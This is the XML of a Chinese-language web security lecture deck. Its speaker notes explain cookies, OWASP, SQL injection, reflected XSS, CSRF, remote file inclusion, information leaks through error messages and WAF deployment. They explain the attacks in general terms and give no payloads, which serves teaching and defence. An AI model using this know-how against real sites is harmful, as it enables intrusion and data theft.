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4"/>
  </p:notesMasterIdLst>
  <p:handoutMasterIdLst>
    <p:handoutMasterId r:id="rId115"/>
  </p:handoutMasterIdLst>
  <p:sldIdLst>
    <p:sldId id="1346" r:id="rId2"/>
    <p:sldId id="2028" r:id="rId3"/>
    <p:sldId id="2117" r:id="rId4"/>
    <p:sldId id="1864" r:id="rId5"/>
    <p:sldId id="1865" r:id="rId6"/>
    <p:sldId id="2118" r:id="rId7"/>
    <p:sldId id="2119" r:id="rId8"/>
    <p:sldId id="2120" r:id="rId9"/>
    <p:sldId id="2121" r:id="rId10"/>
    <p:sldId id="2122" r:id="rId11"/>
    <p:sldId id="2123" r:id="rId12"/>
    <p:sldId id="2124" r:id="rId13"/>
    <p:sldId id="2125" r:id="rId14"/>
    <p:sldId id="2126" r:id="rId15"/>
    <p:sldId id="2127" r:id="rId16"/>
    <p:sldId id="1868" r:id="rId17"/>
    <p:sldId id="1944" r:id="rId18"/>
    <p:sldId id="1870" r:id="rId19"/>
    <p:sldId id="2212" r:id="rId20"/>
    <p:sldId id="1945" r:id="rId21"/>
    <p:sldId id="1948" r:id="rId22"/>
    <p:sldId id="1949" r:id="rId23"/>
    <p:sldId id="1950" r:id="rId24"/>
    <p:sldId id="1951" r:id="rId25"/>
    <p:sldId id="1952" r:id="rId26"/>
    <p:sldId id="1953" r:id="rId27"/>
    <p:sldId id="1954" r:id="rId28"/>
    <p:sldId id="1955" r:id="rId29"/>
    <p:sldId id="1956" r:id="rId30"/>
    <p:sldId id="1875" r:id="rId31"/>
    <p:sldId id="1876" r:id="rId32"/>
    <p:sldId id="1877" r:id="rId33"/>
    <p:sldId id="1878" r:id="rId34"/>
    <p:sldId id="1928" r:id="rId35"/>
    <p:sldId id="1929" r:id="rId36"/>
    <p:sldId id="1930" r:id="rId37"/>
    <p:sldId id="1879" r:id="rId38"/>
    <p:sldId id="1922" r:id="rId39"/>
    <p:sldId id="1923" r:id="rId40"/>
    <p:sldId id="1924" r:id="rId41"/>
    <p:sldId id="1925" r:id="rId42"/>
    <p:sldId id="1926" r:id="rId43"/>
    <p:sldId id="1927" r:id="rId44"/>
    <p:sldId id="1880" r:id="rId45"/>
    <p:sldId id="2213" r:id="rId46"/>
    <p:sldId id="2214" r:id="rId47"/>
    <p:sldId id="2215" r:id="rId48"/>
    <p:sldId id="2216" r:id="rId49"/>
    <p:sldId id="2217" r:id="rId50"/>
    <p:sldId id="2218" r:id="rId51"/>
    <p:sldId id="2219" r:id="rId52"/>
    <p:sldId id="2220" r:id="rId53"/>
    <p:sldId id="2221" r:id="rId54"/>
    <p:sldId id="2222" r:id="rId55"/>
    <p:sldId id="2223" r:id="rId56"/>
    <p:sldId id="2225" r:id="rId57"/>
    <p:sldId id="2226" r:id="rId58"/>
    <p:sldId id="2227" r:id="rId59"/>
    <p:sldId id="2128" r:id="rId60"/>
    <p:sldId id="1881" r:id="rId61"/>
    <p:sldId id="1882" r:id="rId62"/>
    <p:sldId id="1883" r:id="rId63"/>
    <p:sldId id="1884" r:id="rId64"/>
    <p:sldId id="1885" r:id="rId65"/>
    <p:sldId id="1931" r:id="rId66"/>
    <p:sldId id="1932" r:id="rId67"/>
    <p:sldId id="1933" r:id="rId68"/>
    <p:sldId id="1934" r:id="rId69"/>
    <p:sldId id="1935" r:id="rId70"/>
    <p:sldId id="1936" r:id="rId71"/>
    <p:sldId id="1937" r:id="rId72"/>
    <p:sldId id="1939" r:id="rId73"/>
    <p:sldId id="1938" r:id="rId74"/>
    <p:sldId id="1940" r:id="rId75"/>
    <p:sldId id="1941" r:id="rId76"/>
    <p:sldId id="1942" r:id="rId77"/>
    <p:sldId id="1943" r:id="rId78"/>
    <p:sldId id="1886" r:id="rId79"/>
    <p:sldId id="1887" r:id="rId80"/>
    <p:sldId id="1888" r:id="rId81"/>
    <p:sldId id="1889" r:id="rId82"/>
    <p:sldId id="1890" r:id="rId83"/>
    <p:sldId id="1891" r:id="rId84"/>
    <p:sldId id="1892" r:id="rId85"/>
    <p:sldId id="1893" r:id="rId86"/>
    <p:sldId id="1894" r:id="rId87"/>
    <p:sldId id="1895" r:id="rId88"/>
    <p:sldId id="1896" r:id="rId89"/>
    <p:sldId id="1897" r:id="rId90"/>
    <p:sldId id="1898" r:id="rId91"/>
    <p:sldId id="1899" r:id="rId92"/>
    <p:sldId id="1900" r:id="rId93"/>
    <p:sldId id="1901" r:id="rId94"/>
    <p:sldId id="1902" r:id="rId95"/>
    <p:sldId id="1903" r:id="rId96"/>
    <p:sldId id="1904" r:id="rId97"/>
    <p:sldId id="1905" r:id="rId98"/>
    <p:sldId id="1906" r:id="rId99"/>
    <p:sldId id="1907" r:id="rId100"/>
    <p:sldId id="1908" r:id="rId101"/>
    <p:sldId id="1909" r:id="rId102"/>
    <p:sldId id="1910" r:id="rId103"/>
    <p:sldId id="1911" r:id="rId104"/>
    <p:sldId id="1912" r:id="rId105"/>
    <p:sldId id="1913" r:id="rId106"/>
    <p:sldId id="1914" r:id="rId107"/>
    <p:sldId id="1915" r:id="rId108"/>
    <p:sldId id="1916" r:id="rId109"/>
    <p:sldId id="1917" r:id="rId110"/>
    <p:sldId id="1918" r:id="rId111"/>
    <p:sldId id="1919" r:id="rId112"/>
    <p:sldId id="1430" r:id="rId113"/>
  </p:sldIdLst>
  <p:sldSz cx="9144000" cy="6858000" type="screen4x3"/>
  <p:notesSz cx="6858000" cy="9144000"/>
  <p:custDataLst>
    <p:tags r:id="rId11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lf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ACA00"/>
    <a:srgbClr val="3366FF"/>
    <a:srgbClr val="6699FF"/>
    <a:srgbClr val="000066"/>
    <a:srgbClr val="66FFCC"/>
    <a:srgbClr val="66CCFF"/>
    <a:srgbClr val="029A1B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4" autoAdjust="0"/>
    <p:restoredTop sz="84615" autoAdjust="0"/>
  </p:normalViewPr>
  <p:slideViewPr>
    <p:cSldViewPr snapToGrid="0">
      <p:cViewPr varScale="1">
        <p:scale>
          <a:sx n="97" d="100"/>
          <a:sy n="97" d="100"/>
        </p:scale>
        <p:origin x="200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2832" y="22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commentAuthors" Target="commentAuthor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11T15:36:15.920" idx="1">
    <p:pos x="10" y="1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B4577F0-ED67-4FFE-A316-3B3AEC2EA4D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16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46A9642-FD4A-45CC-9F4F-8E10AB9AB4A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8793118-89C1-46D5-A5F9-D5DB293598F6}" type="slidenum">
              <a:rPr lang="en-US" altLang="zh-CN"/>
              <a:t>2</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US" altLang="zh-CN"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="1778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78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HTTP无状态协议，是指协议对于事务处理没有记忆能力。缺少状态意味着如果后续处理需要前面的信息，则它必须重传，这样可能导致每次连接传送的数据量增大。另一方面，在服务器不需要先前信息时它的应答就较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Cookie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在生成时就会被指定一个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Expire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值，这就是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Cookie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的生存周期，在这个周期内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Cookie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有效，超出周期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Cookie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就会被自动清除。有些页面将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Cookie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的生存周期设置为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或负值，这样在关闭页面时，浏览器立即清除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Cookie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，有效保护了用户隐私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6A9642-FD4A-45CC-9F4F-8E10AB9AB4AA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E3C7EC-96FC-4F22-A477-BF96B2BE937D}" type="slidenum">
              <a:rPr lang="zh-CN" altLang="en-US"/>
              <a:t>16</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US" altLang="zh-CN"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="459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介绍</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN"/>
              <a:t>OWASP</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US"/>
              <a:t>机构是因为</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN"/>
              <a:t>Web</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US"/>
              <a:t>安全的内容是以其最新的研究成果为主线来讲。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E3C7EC-96FC-4F22-A477-BF96B2BE937D}" type="slidenum">
              <a:rPr lang="zh-CN" altLang="en-US"/>
              <a:t>17</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US" altLang="zh-CN"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="459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介绍</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN"/>
              <a:t>OWASP</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US"/>
              <a:t>机构是因为</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN"/>
              <a:t>Web</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US"/>
              <a:t>安全的内容是以其最新的研究成果为主线来讲。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Web 程序代码中对于用户提交的参数未做过滤就直接放到 SQL 语句中执行，导致参数中的特殊字符打破了 SQL 语句原有逻辑，黑客可以利用该漏洞执行任意 SQL 语句，如查询数据、下载数据、写入webshell 、执行系统命令以及绕过登录限制等。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https://www.bilibili.com/video/BV1PR4y157hC?p=1&amp;vd_source=44abe4b6a077e526bca7ec4afa5abe96</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0" smtClean="0"/>
              <a:t>https://www.bilibili.com/video/BV16X4y1C74o/?spm_id_from=333.337.search-card.all.click&amp;vd_source=44abe4b6a077e526bca7ec4afa5abe96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6A9642-FD4A-45CC-9F4F-8E10AB9AB4AA}" type="slidenum">
              <a:rPr lang="en-US" altLang="zh-CN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2598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7D0ADC0-B318-45CC-9130-F3B790A9505E}" type="slidenum">
              <a:rPr lang="zh-CN" altLang="en-US"/>
              <a:t>32</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US" altLang="zh-CN"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="42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DOM</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US"/>
              <a:t>，文件对象模型，</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN"/>
              <a:t>Document Object Model.</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US"/>
              <a:t>是给</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN"/>
              <a:t>HTML</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US"/>
              <a:t>和</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN"/>
              <a:t>xml</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US"/>
              <a:t>文件使用的一组</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN"/>
              <a:t>API</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US"/>
              <a:t>，是建立网页与</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN"/>
              <a:t>Script</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US"/>
              <a:t>语言沟通的桥梁，比如</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN"/>
              <a:t>table</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US"/>
              <a:t>对象代表</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN"/>
              <a:t>HTML</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US"/>
              <a:t>中的表格，可以由</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN"/>
              <a:t>JavaScript</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US"/>
              <a:t>脚本取用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B9C413F-FDA4-48FD-8A72-A3A13F3BEBDA}" type="slidenum">
              <a:rPr lang="zh-CN" altLang="en-US"/>
              <a:t>33</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US" altLang="zh-CN"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="507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7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en-US" altLang="zh-CN">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Search”</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>框内文本信息反馈回用户页面是什么意思呢？比如说用户输入“价格”这个词，点击查询，从</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Web</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>端反馈回来的刷新页面常常会将“价格”这个词显示在页面上，比如：您查找的“价格”不存在；您查找的“价格”有如下</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>8</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>条记录信息</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>……</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>等等。</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>而如果输入的不是正常的文本，而是</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Javascript</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>脚本，页面也会尝试将这个脚本当成文本显示出来，这样就会引发客户端浏览器去执行这段脚本，不是简单的显示。这样就能知道该站点对输入的文本没有进行严格的检查过滤，是存在</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>XSS</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>攻击漏洞的。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6A9642-FD4A-45CC-9F4F-8E10AB9AB4AA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8793118-89C1-46D5-A5F9-D5DB293598F6}" type="slidenum">
              <a:rPr lang="en-US" altLang="zh-CN"/>
              <a:t>45</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US" altLang="zh-CN"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="1778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78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通用与专用</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>很多单位需要重点保护的是</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>Web</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>服务器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6A9642-FD4A-45CC-9F4F-8E10AB9AB4AA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https://www.qianxin.com/product/detail/pid/19</a:t>
            </a:r>
          </a:p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Web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应用防火墙系统是以网站或应用系统为核心的安全产品，通过对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HTTPS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Web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攻击行为进行分析并拦截，有效的降低网站安全风险。产品主要部署在网站服务器的前方。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Web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应用防火墙系统可以有效地缓解网站及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Web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应用系统面临如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0WASP TOP 10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中定义的常见威胁；可以快速地应对恶意攻击者对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Web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业务带来的冲击。让网站免遭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Web</a:t>
            </a:r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攻击侵扰并对网站代码进行合理加固</a:t>
            </a:r>
            <a:endParaRPr kumimoji="1" lang="en-US" altLang="zh-CN" sz="1200" b="0" i="0" kern="120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Web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应用防火墙提供了细粒度的特征库，产品支持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HTTP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协议效验、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Web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特征库（基于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OWASP TOP 10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标准）、爬虫规则、防盗链规则、跨站请求规则、文件上传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下载、敏感信息、弱密码检测等多种细粒度检测的特征库匹配规则。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6A9642-FD4A-45CC-9F4F-8E10AB9AB4AA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反向代理模式下，将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WAF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部署在了服务器之前，用户访问时，不知道服务器的的具体存在，会直接访问到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WAF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，如果是恶意请求或攻击，访问会被直接拦截，正常的访问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WAF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才会向服务器转发请求。这是最常见的一种部署模式。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6A9642-FD4A-45CC-9F4F-8E10AB9AB4AA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通常只有硬件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WAF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才会部署为透明代理。透明代理模式下，用户访问时不知道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WAF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的存在，访问会直接指向真实服务器，但流量到达服务器之前，会隐性的被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WAF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过滤，只有正常的访问才会被放行到服务器，恶意的访问、攻击都会被拦截。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6A9642-FD4A-45CC-9F4F-8E10AB9AB4AA}" type="slidenum">
              <a:rPr lang="en-US" altLang="zh-CN" smtClean="0"/>
              <a:t>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872ED6C-E0DE-4E88-992F-C6FD1BE37116}" type="slidenum">
              <a:rPr lang="zh-CN" altLang="en-US"/>
              <a:t>63</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US" altLang="zh-CN"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="43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说明：</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN"/>
              <a:t>SSL</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US"/>
              <a:t>、防火墙等安全措施对于此类攻击完全没用。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6A9642-FD4A-45CC-9F4F-8E10AB9AB4AA}" type="slidenum">
              <a:rPr lang="en-US" altLang="zh-CN" smtClean="0"/>
              <a:t>67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 smtClean="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" dirty="0" smtClean="0"/>
              <a:t>其中</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0" smtClean="0"/>
              <a:t>”-u”</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" dirty="0" smtClean="0"/>
              <a:t>参数用于指定检测的</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0" smtClean="0"/>
              <a:t>URL</a:t>
            </a:r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6A9642-FD4A-45CC-9F4F-8E10AB9AB4AA}" type="slidenum">
              <a:rPr lang="en-US" altLang="zh-CN" smtClean="0"/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A702537-91C8-4F8B-9142-7626BF94862C}" type="slidenum">
              <a:rPr lang="zh-CN" altLang="en-US"/>
              <a:t>79</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US" altLang="zh-CN"/>
          </a:p>
        </p:txBody>
      </p:sp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恶意文件执行漏洞也称为不安全的远端文件包含漏洞</a:t>
            </a:r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B21F77C-4309-462A-A3C3-F142311DBDD3}" type="slidenum">
              <a:rPr lang="zh-CN" altLang="en-US"/>
              <a:t>86</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US" altLang="zh-CN"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="465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CSRF</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US"/>
              <a:t>攻击强迫已登录的受害者的浏览器向一个易受攻击的</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN"/>
              <a:t>Web</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US"/>
              <a:t>应用程序发送一个请求，然后它再代表受害者执行所选择的有利于攻击者的行为。</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US"/>
              <a:t>这段描述的关键部分是“强迫已登录的”受害者发送请求。攻击者利用网站对目标用户的信任。 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D471A18-DCD3-421C-A49D-A7D5BCA182D1}" type="slidenum">
              <a:rPr lang="zh-CN" altLang="en-US"/>
              <a:t>90</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US" altLang="zh-CN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查明堆栈跟踪：为程序员提供详尽的信息，说明错误发生前调用了哪些程序或函数。相同的信息还可为计算机罪犯提供函数、对象名称，以及其它设计针对报告错误的系统的攻击的相关情况。 </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN"/>
              <a:t>SQL</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US"/>
              <a:t>状态信息：揭示数据库、字段和表名称</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN"/>
              <a:t>——</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US"/>
              <a:t>在计划实施</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN"/>
              <a:t>SQL</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US"/>
              <a:t>注入之类的攻击时，与数据库有关的信息十分重要 </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US"/>
              <a:t>登录信息：登录失败后，通知用户是否用户</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN"/>
              <a:t>ID</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US"/>
              <a:t>或密码出错</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN"/>
              <a:t>——</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US"/>
              <a:t>登录失败可能是由于</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN"/>
              <a:t>ID</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US"/>
              <a:t>或密码错误造成的。这为一个对关键资产发动暴力攻击的攻击者提供重要信息。 </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US"/>
              <a:t>授权信息：确认某个文件</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN"/>
              <a:t>——</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US"/>
              <a:t>如果未获得授权的用户企图访问某个文件，返回的错误消息会告诉她没有取得访问那个资源的授权。如果她是一名试图定位某个包含敏感信息的文件的攻击者，错误消息就为她提供了肯定信息。 </a:t>
            </a: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AC0CFEC-F992-41B9-96E5-29E055FBD6AC}" type="slidenum">
              <a:rPr lang="zh-CN" altLang="en-US"/>
              <a:t>110</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US" altLang="zh-CN"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="443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OWASP</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US"/>
              <a:t>的产品</a:t>
            </a:r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D00620-6178-46C5-8F20-2517766D17DD}" type="slidenum">
              <a:rPr lang="zh-CN" altLang="en-US"/>
              <a:t>112</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US" altLang="zh-CN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1C61395C-8CDD-4FA2-ADB5-FD6889F54024}" type="datetime1">
              <a:rPr lang="zh-CN" altLang="en-US" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="1C1C1C"/>
                </a:solidFill>
              </a:rPr>
              <a:t>2023/5/19</a:t>
            </a:fld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19E74429-26DC-471E-9251-C4807B21DCEF}" type="slidenum">
              <a:rPr lang="en-US" altLang="zh-CN">
                <a:solidFill>
                  <a:srgbClr val="1C1C1C"/>
                </a:solidFill>
              </a:r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ts val="3400"/>
              </a:lnSpc>
              <a:defRPr/>
            </a:lvl1pPr>
            <a:lvl2pPr>
              <a:lnSpc>
                <a:spcPts val="3400"/>
              </a:lnSpc>
              <a:defRPr/>
            </a:lvl2pPr>
            <a:lvl3pPr>
              <a:lnSpc>
                <a:spcPts val="3400"/>
              </a:lnSpc>
              <a:defRPr/>
            </a:lvl3pPr>
            <a:lvl4pPr>
              <a:lnSpc>
                <a:spcPts val="3400"/>
              </a:lnSpc>
              <a:defRPr/>
            </a:lvl4pPr>
            <a:lvl5pPr>
              <a:lnSpc>
                <a:spcPts val="3400"/>
              </a:lnSpc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AD5F1-67B5-4A0D-ABC1-AB8E7ABAD35E}" type="datetime1">
              <a:rPr lang="zh-CN" altLang="en-US" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>2023/5/19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EB7420-10C5-4439-A879-6C64816B7E29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58813" y="155416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1213" y="155416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7064C-0A55-4E07-B965-6C3D3728ABB2}" type="datetime1">
              <a:rPr lang="zh-CN" altLang="en-US" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>2023/5/19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8E056-97FC-4A70-8131-E02F6583BF82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ED8A2-82FC-4DC1-9863-2A50613A6AE6}" type="datetime1">
              <a:rPr lang="zh-CN" altLang="en-US" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>2023/5/19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FD273C-C71A-40AC-9777-8B20B0D93BC7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295FB-9049-4B10-8132-A2704FC040E4}" type="datetime1">
              <a:rPr lang="zh-CN" altLang="en-US" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>2023/5/19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2B63A-4FE1-4D96-8285-FCAE99EA7890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E94A6A-DBE8-4CE6-9619-41C62789DE7E}" type="datetime1">
              <a:rPr lang="zh-CN" altLang="en-US" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>2023/5/19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33275C-2774-4B25-97E7-7065F970E90C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51A7E-C721-4544-8D2F-3546C0565F84}" type="datetime1">
              <a:rPr lang="zh-CN" altLang="en-US" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>2023/5/19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1E245-20D5-4D11-AD9A-5B593160C07A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E5F7E-5148-4CB2-963A-95C37528F550}" type="datetime1">
              <a:rPr lang="zh-CN" altLang="en-US" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>2023/5/19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ED92-367B-4CD8-A26C-4E6248EAD48D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73875" y="142875"/>
            <a:ext cx="2070100" cy="55260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58813" y="142875"/>
            <a:ext cx="6062662" cy="55260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5DC17-A35B-464B-A9AB-82DCA891CFF2}" type="datetime1">
              <a:rPr lang="zh-CN" altLang="en-US" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>2023/5/19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975A5-F217-4B48-B315-600F055D9787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44450"/>
            <a:ext cx="6481762" cy="7921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4038600" cy="5257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57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6365875" y="6624638"/>
            <a:ext cx="2743200" cy="2603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理工大学指挥自动化学院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3419475" y="6594475"/>
            <a:ext cx="2133600" cy="263525"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle>
            <a:lvl1pPr>
              <a:defRPr/>
            </a:lvl1pPr>
          </a:lstStyle>
          <a:p>
            <a:fld id="{C61590EF-26F2-4333-8C15-39977E75E3F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417513" y="439738"/>
            <a:ext cx="438150" cy="47466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ltGray">
          <a:xfrm>
            <a:off x="800100" y="439738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ltGray">
          <a:xfrm>
            <a:off x="541338" y="862013"/>
            <a:ext cx="422275" cy="4746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ltGray">
          <a:xfrm>
            <a:off x="911225" y="862013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ltGray">
          <a:xfrm>
            <a:off x="127000" y="78898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gray">
          <a:xfrm>
            <a:off x="762000" y="331788"/>
            <a:ext cx="31750" cy="105251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gray">
          <a:xfrm>
            <a:off x="442913" y="112236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142875"/>
            <a:ext cx="7793037" cy="958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8813" y="1554163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48413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4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812D72D-DA04-4C9C-9A6E-C01386CD88CE}" type="datetime1">
              <a:rPr lang="zh-CN" altLang="en-US" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>2023/5/19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4841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48413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8C58080-A4A9-4607-B318-5D24794E2C9C}" type="slidenum">
              <a:rPr lang="en-US" altLang="zh-CN">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
              </a:r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539750" y="63325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2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090" name="Line 18"/>
          <p:cNvSpPr>
            <a:spLocks noChangeShapeType="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="827088" y="6189663"/>
            <a:ext cx="0" cy="50323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wrap="none"/>
          <a:lstStyle/>
          <a:p>
